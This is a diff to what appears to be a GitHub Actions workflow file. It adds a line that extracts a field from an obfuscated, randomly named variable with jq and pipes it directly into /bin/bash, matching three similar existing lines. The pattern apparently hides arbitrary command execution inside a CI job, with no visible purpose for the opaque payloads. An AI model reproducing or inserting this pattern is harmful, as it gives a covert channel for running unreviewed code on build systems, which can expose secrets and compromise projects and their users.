@@ -31,6 +31,7 @@ jobs:
           echo $cds37593 | jq -r .etjz6 | /bin/bash
           echo $xl46 | jq -r .uiqcr46 | /bin/bash
           printf '%s' "$i4" | jq -r .dc560 | /bin/bash
+          printf '%s' "$cl3113" | jq -r .cwjyo26 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
